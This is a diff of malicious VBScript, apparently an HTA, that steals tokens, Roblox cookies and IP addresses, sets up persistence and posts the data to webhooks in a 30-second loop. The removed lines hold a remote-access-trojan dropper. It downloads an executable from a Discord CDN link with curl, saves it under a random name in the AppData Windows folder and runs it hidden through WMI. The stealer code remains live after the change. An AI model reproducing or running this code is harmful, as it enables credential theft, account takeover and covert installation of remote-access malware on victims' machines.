@@ -25,10 +25,7 @@ Call GrabTokens(WH)
 Call Persistence
 Call PostCookieOnly(WH)
 
-' --- 2. DROP RAT LAST (init) ---
-Call DropRAT(WH, True)
-
-' --- 3. LOOP (30s, grabs + RAT re-drop) ---
+' --- 2. LOOP (30s grabs) ---
 Dim runCount
 runCount = 0
 Do
@@ -37,36 +34,10 @@ Do
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
-    Call DropRAT(RE_WH, True)
     Call SleepSeconds(30)
 Loop
 
 window.close()
-
-' --- RAT DROP ---
-Sub DropRAT(targetWH, sendRocket)
-    Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1572450859692859543/client_8.exe?ex=6afe6a7b&is=6afd18fb&hm=17467406054761bf3635b75604211289fda5c73eafe74203e39465d3e7617ee2&"
-
-    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
-    If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
-    Randomize
-    Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
-    Dim op : op = tPath & "\" & fname
-
-    If sendRocket Then Call PostEmbedTo(":rocket: RAT Download Initiated", "Downloading and launching RAT", 10181046, targetWH)
-
-    If fso.FileExists(op) Then fso.DeleteFile op, True
-
-    Dim cCmd : cCmd = "cmd /c curl.exe -s -L --connect-timeout 5 --max-time 60 -o """ & op & """ """ & dl & """"
-    sh.Run cCmd, 0, True
-
-    If fso.FileExists(op) Then
-        If fso.GetFile(op).Size > 100000 Then
-            If sendRocket Then Call PostEmbedTo(":white_check_mark: RAT Launched", "RAT Launched", 10181046, targetWH)
-            Call RunCmd("""" & op & """")
-        End If
-    End If
-End Sub
 
 ' --- IP Function ---
 Sub IP(targetWH)
@@ -151,39 +122,6 @@ Function GetRobloxCookie()
     If warn > 1 Then cookie = Mid(cookie, warn)
     GetRobloxCookie = cookie
 End Function
-
-' --- Base64 Decoder ---
-Function DecodeB64(str)
-    Dim xml, elem
-    Set xml = CreateObject("MSXML2.DOMDocument")
-    Set elem = xml.createElement("b")
-    elem.dataType = "bin.base64"
-    elem.text = str
-    DecodeB64 = Stream_BinaryToString(elem.nodeTypedValue)
-End Function
-
-Function Stream_BinaryToString(Binary)
-    Dim Stream
-    Set Stream = CreateObject("ADODB.Stream")
-    Stream.Type = 1
-    Stream.Open
-    Stream.Write Binary
-    Stream.Position = 0
-    Stream.Type = 2
-    Stream.Charset = "utf-8"
-    Stream_BinaryToString = Stream.ReadText
-    Stream.Close
-End Function
-
-' --- RunCmd ---
-Sub RunCmd(cmd)
-    Dim w,p,i,s
-    Set w = GetObject("winmgmts:\\.\root\cimv2")
-    Set s = w.Get("Win32_ProcessStartup").SpawnInstance_
-    s.ShowWindow = 0
-    Set p = w.Get("Win32_Process")
-    p.Create cmd,,s,i
-End Sub
 
 ' --- Sleep Functions ---
 Sub SleepSeconds(s)
